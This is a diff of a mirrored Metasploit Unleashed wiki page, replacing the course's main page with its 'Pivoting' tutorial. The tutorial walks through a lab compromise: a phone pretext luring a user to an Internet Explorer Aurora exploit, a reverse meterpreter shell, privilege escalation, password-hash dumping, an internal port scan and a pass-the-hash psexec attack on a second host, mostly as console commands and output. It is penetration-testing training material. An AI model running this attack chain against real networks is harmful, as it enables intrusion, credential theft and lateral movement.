@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Pivoting - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Pivoting" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Pivoting&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Pivoting&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Pivoting&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,420 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Pivoting</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Pivoting#column-one">navigation</a>, <a href="Pivoting#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>Pivoting is the unique technique of using an instance (also referred to as a 'plant' or 'foothold') to be able to "move" around inside a network. Basically using the first compromise to allow and even aid in the compromise of other otherwise inaccessible systems. In this scenario we will be using it for routing traffic from a normally non-routable network.
+<br />
+<br />
+For example, we are a pentester for Security-R-Us. You pull the company directory and decide to target a user in the target IT department. You call up the user and claim you are from a vendor and would like them to visit your website in order to download a security patch. At the URL you are pointing them to, you are running an Internet Explorer exploit. 
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>use exploit/windows/browser/ms10_002_aurora</span> 
+msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options:
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   SRVHOST     0.0.0.0          yes       The local host to listen on.
+   SRVPORT     8080             yes       The local port to listen on.
+   SSL         false            no        Negotiate SSL for incoming connections
+   SSLVersion  SSL3             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)
+   URIPATH                      no        The URI to use for this exploit (default is random)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) > <span style='color:#13C16A;'>set URIPATH /</span>
+URIPATH => /
+msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) > <span style='color:#13C16A;'>set PAYLOAD windows/meterpreter/reverse_tcp</span>
+PAYLOAD => windows/meterpreter/reverse_tcp
+msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) > <span style='color:#13C16A;'>set LHOST 192.168.1.101</span>
+LHOST => 192.168.1.101
+msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) > <span style='color:#13C16A;'>exploit -j</span>
+<span style='color:#0000FF;'>[*]</span> Exploit running as background job.
+
+<span style='color:#0000FF;'>[*]</span> Started reverse handler on 192.168.1.101:4444 
+<span style='color:#0000FF;'>[*]</span> Using URL: http://0.0.0.0:8080/
+<span style='color:#0000FF;'>[*]</span>  Local IP: http://192.168.1.101:8080/
+<span style='color:#0000FF;'>[*]</span> Server started.
+msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) ></pre>
+<br />
+When the target visits our malicious URL, a meterpreter session is opened for us giving full access the the system.
+<br />
+<br />
+<pre>msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) > 
+<span style='color:#0000FF;'>[*]</span> Sending Internet Explorer "Aurora" Memory Corruption to client 192.168.1.201
+<span style='color:#0000FF;'>[*]</span> Sending stage (749056 bytes) to 192.168.1.201
+<span style='color:#0000FF;'>[*]</span> Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.201:8777) at Mon Dec 06 08:22:29 -0700 2010
+
+msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) > <span style='color:#13C16A;'>sessions -l</span>
+
+Active sessions
+===============
+
+  Id  Type                   Information                                      Connection
+  --  ----                   -----------                                      ----------
+  1   meterpreter x86/win32  XEN-XP-SP2-BARE\Administrator @ XEN-XP-SP2-BARE  192.168.1.101:4444 -> 192.168.1.201:8777
+
+msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) ></pre>
+<br />
+When we connect to our meterpreter session, we run ipconfig and see that the exploited system is dual-homed, a common configuration amongst IT staff.
+<br />
+<br />
+<pre>msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) > <span style='color:#13C16A;'>sessions -i 1</span>
+<span style='color:#0000FF;'>[*]</span> Starting interaction with 1...
+
+<u>meterpreter</u> > <span style='color:#13C16A;'>ipconfig</span>
+
+Citrix XenServer PV Ethernet Adapter #2 - Packet Scheduler Miniport
+Hardware MAC: d2:d6:70:fa:de:65
+IP Address  : 10.1.13.3
+Netmask     : 255.255.255.0
+
+
+
+MS TCP Loopback interface
+Hardware MAC: 00:00:00:00:00:00
+IP Address  : 127.0.0.1
+Netmask     : 255.0.0.0
+
+
+
+Citrix XenServer PV Ethernet Adapter - Packet Scheduler Miniport
+Hardware MAC: c6:ce:4e:d9:c9:6e
+IP Address  : 192.168.1.201
+Netmask     : 255.255.255.0
+
+
+<u>meterpreter</u> ></pre>
+<br />
+We want to leverage this newly discovered information and attack this additional network. Metasploit has an autoroute meterpreter script that will allow us to attack this second network through our first compromised machine.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>run autoroute -h</span>
+<span style='color:#0000FF;'>[*]</span> Usage:   run autoroute [-r] -s subnet -n netmask
+<span style='color:#0000FF;'>[*]</span> Examples:
+<span style='color:#0000FF;'>[*]</span>   run autoroute -s 10.1.1.0 -n 255.255.255.0  # Add a route to 10.10.10.1/255.255.255.0
+<span style='color:#0000FF;'>[*]</span>   run autoroute -s 10.10.10.1                 # Netmask defaults to 255.255.255.0
+<span style='color:#0000FF;'>[*]</span>   run autoroute -s 10.10.10.1/24              # CIDR notation is also okay
+<span style='color:#0000FF;'>[*]</span>   run autoroute -p                            # Print active routing table
+<span style='color:#0000FF;'>[*]</span>   run autoroute -d -s 10.10.10.1              # Deletes the 10.10.10.1/255.255.255.0 route
+<span style='color:#0000FF;'>[*]</span> Use the "route" and "ipconfig" Meterpreter commands to learn about available routes
+<u>meterpreter</u> > <span style='color:#13C16A;'>run autoroute -s 10.1.13.0/24</span>
+<span style='color:#0000FF;'>[*]</span> Adding a route to 10.1.13.0/255.255.255.0...
+<span style='color:#00ff00;'>[+]</span> Added route to 10.1.13.0/255.255.255.0 via 192.168.1.201
+<span style='color:#0000FF;'>[*]</span> Use the -p option to list all active routes
+<u>meterpreter</u> > <span style='color:#13C16A;'>run autoroute -p</span>
+
+Active Routing Table
+====================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   10.1.13.0          255.255.255.0      Session 1
+
+<u>meterpreter</u> ></pre>
+<br />
+Now that we have added our additional route, we will escalate to SYSTEM, dump the password hashes, and background our meterpreter session by pressing Ctrl-z.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>getsystem</span>
+...got system (via technique 1).
+<u>meterpreter</u> > <span style='color:#13C16A;'>run hashdump</span>
+<span style='color:#0000FF;'>[*]</span> Obtaining the boot key...
+<span style='color:#0000FF;'>[*]</span> Calculating the hboot key using SYSKEY c2ec80f879c1b5dc8d2b64f1e2c37a45...
+<span style='color:#0000FF;'>[*]</span> Obtaining the user list and keys...
+<span style='color:#0000FF;'>[*]</span> Decrypting user keys...
+<span style='color:#0000FF;'>[*]</span> Dumping password hashes...
+
+
+Administrator:500:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:9a6ae26408b0629ddc621c90c897b42d:07a59dbe14e2ea9c4792e2f189e2de3a:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:ebf9fa44b3204029db5a8a77f5350160:::
+victim:1004:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
+
+
+<u>meterpreter</u> > 
+Background session 1? [y/N]  
+msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) ></pre> 
+<br />
+Now we need to determine if there are other systems on this second network we have discovered. We will use a basic TCP port scanner to look for ports 139 and 445.
+<br />
+<br />
+<pre>msf exploit(<span style='color:#ff0000;'>ms10_002_aurora</span>) > <span style='color:#13C16A;'>use auxiliary/scanner/portscan/tcp</span> 
+msf auxiliary(<span style='color:#ff0000;'>tcp</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options:
+
+   Name         Current Setting  Required  Description
+   ----         ---------------  --------  -----------
+   CONCURRENCY  10               yes       The number of concurrent ports to check per host
+   FILTER                        no        The filter string for capturing traffic
+   INTERFACE                     no        The name of the interface
+   PCAPFILE                      no        The name of the PCAP capture file to process
+   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
+   RHOSTS                        yes       The target address range or CIDR identifier
+   SNAPLEN      65535            yes       The number of bytes to capture
+   THREADS      1                yes       The number of concurrent threads
+   TIMEOUT      1000             yes       The socket connect timeout in milliseconds
+   VERBOSE      false            no        Display verbose output
+
+msf auxiliary(<span style='color:#ff0000;'>tcp</span>) > <span style='color:#13C16A;'>set RHOSTS 10.1.13.0/24</span>
+RHOST => 10.1.13.0/24
+msf auxiliary(<span style='color:#ff0000;'>tcp</span>) > <span style='color:#13C16A;'>set PORTS 139,445</span>
+PORTS => 139,445
+msf auxiliary(<span style='color:#ff0000;'>tcp</span>) > <span style='color:#13C16A;'>set THREADS 50</span>
+THREADS => 50
+msf auxiliary(<span style='color:#ff0000;'>tcp</span>) > <span style='color:#13C16A;'>run</span>
+
+<span style='color:#0000FF;'>[*]</span> 10.1.13.3:139 - TCP OPEN
+<span style='color:#0000FF;'>[*]</span> 10.1.13.3:445 - TCP OPEN
+<span style='color:#0000FF;'>[*]</span> 10.1.13.2:445 - TCP OPEN
+<span style='color:#0000FF;'>[*]</span> 10.1.13.2:139 - TCP OPEN
+<span style='color:#0000FF;'>[*]</span> Scanned 256 of 256 hosts (100% complete)
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed
+msf auxiliary(<span style='color:#ff0000;'>tcp</span>) ></pre> 
+<br />
+We have discovered an additional machine on this network with ports 139 and 445 open so we will try to re-use our gathered password hash with the psexec exploit module.  Since many companies use imaging software, the local Administrator password is frequently the same across the entire enterprise.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>tcp</span>) > <span style='color:#13C16A;'>use exploit/windows/smb/psexec</span> 
+msf exploit(<span style='color:#ff0000;'>psexec</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options:
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   RHOST                       yes       The target address
+   RPORT      445              yes       Set the SMB service port
+   SMBDomain  WORKGROUP        no        The Windows domain to use for authentication
+   SMBPass                     no        The password for the specified username
+   SMBUser                     no        The username to authenticate as
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(<span style='color:#ff0000;'>psexec</span>) ><span style='color:#13C16A;'> set RHOST 10.1.13.2</span>
+RHOST => 10.1.13.2
+msf exploit(<span style='color:#ff0000;'>psexec</span>) > <span style='color:#13C16A;'>set SMBUser Administrator</span>
+SMBUser => Administrator
+msf exploit(<span style='color:#ff0000;'>psexec</span>) > <span style='color:#13C16A;'>set SMBPass 81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d</span>
+SMBPass => 81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d
+msf exploit(<span style='color:#ff0000;'>psexec</span>) > <span style='color:#13C16A;'>set PAYLOAD windows/meterpreter/bind_tcp</span>
+PAYLOAD => windows/meterpreter/bind_tcp
+msf exploit(<span style='color:#ff0000;'>psexec</span>) > <span style='color:#13C16A;'>exploit</span>
+
+<span style='color:#0000FF;'>[*]</span> Connecting to the server...
+<span style='color:#0000FF;'>[*]</span> Started bind handler
+<span style='color:#0000FF;'>[*]</span> Authenticating to 10.1.13.2:445|WORKGROUP as user 'Administrator'...
+<span style='color:#0000FF;'>[*]</span> Uploading payload...
+<span style='color:#0000FF;'>[*]</span> Created \qNuIKByV.exe...
+<span style='color:#0000FF;'>[*]</span> Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.1.13.2[\svcctl] ...
+<span style='color:#0000FF;'>[*]</span> Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:10.1.13.2[\svcctl] ...
+<span style='color:#0000FF;'>[*]</span> Obtaining a service manager handle...
+<span style='color:#0000FF;'>[*]</span> Creating a new service (UOtrbJMd - "MNYR")...
+<span style='color:#0000FF;'>[*]</span> Closing service handle...
+<span style='color:#0000FF;'>[*]</span> Opening service...
+<span style='color:#0000FF;'>[*]</span> Starting the service...
+<span style='color:#0000FF;'>[*]</span> Removing the service...
+<span style='color:#0000FF;'>[*]</span> Closing service handle...
+<span style='color:#0000FF;'>[*]</span> Deleting \qNuIKByV.exe...
+<span style='color:#0000FF;'>[*]</span> Sending stage (749056 bytes)
+<span style='color:#0000FF;'>[*]</span> Meterpreter session 2 opened (192.168.1.101-192.168.1.201:0 -> 10.1.13.2:4444) at Mon Dec 06 08:56:42 -0700 2010
+
+<u>meterpreter</u> ></pre>
+<br />
+Our attack has been successful! You can see in the above output that we have a meterpreter session connecting to 10.1.13.2 via our existing meterpreter session with 192.168.1.201. Running ipconfig on our newly compromised machine shows that we have reached a system that is not normally accessible to us.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>ipconfig</span>
+
+Citrix XenServer PV Ethernet Adapter
+Hardware MAC: 22:73:ff:12:11:4b
+IP Address  : 10.1.13.2
+Netmask     : 255.255.255.0
+
+
+
+MS TCP Loopback interface
+Hardware MAC: 00:00:00:00:00:00
+IP Address  : 127.0.0.1
+Netmask     : 255.0.0.0
+
+
+<u>meterpreter</u> ></pre>
+<br />
+As you can see, pivoting is an extremely powerful feature and is a critical capability to have on penetration tests.
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="MSF_Post_Exploitation" title="MSF Post Exploitation">MSF Post Exploitation</a> &gt; Pivoting</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><a href="Privilege_Escalation" title="Privilege Escalation">Privilege Escalation</a> &#124; <a href="PSExec_Pass_The_Hash" title="PSExec Pass The Hash">PSExec Pass The Hash</a> &#124; <a href="Event_Log_Management" title="Event Log Management">Event Log Management</a> &#124; <a href="Fun_With_Incognito" title="Fun With Incognito">Fun With Incognito</a> &#124; <a href="Interacting_With_The_Registry" title="Interacting With The Registry">Interacting With The Registry</a> &#124; <a href="Enabling_Remote_Desktop" title="Enabling Remote Desktop">Enabling Remote Desktop</a> &#124; <a href="Packet_Sniffing" title="Packet Sniffing">Packet Sniffing</a> &#124; <strong class="selflink">Pivoting</strong> &#124; <a href="TimeStomp" title="TimeStomp">TimeStomp</a> &#124; <a href="Screen_Capture" title="Screen Capture">Screen Capture</a> &#124; <a href="Searching_For_Content" title="Searching For Content">Searching For Content</a> &#124; <a href="John_The_Ripper" title="John The Ripper">John The Ripper</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total3"><a href="Portfwd" title="Portfwd">Portfwd</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 538/1000000
+Preprocessor generated node count: 2783/1000000
+Post‐expand include size: 3588/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:65-0!*!0!*!*!*!* and timestamp 20131123203346 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Pivoting&amp;oldid=421">http://www.offensive-security.com/w/index.php?title=Pivoting&amp;oldid=421</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:MSF_Post_Exploitation&amp;action=edit&amp;redlink=1" class="new" title="Category:MSF Post Exploitation (page does not exist)">MSF Post Exploitation</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
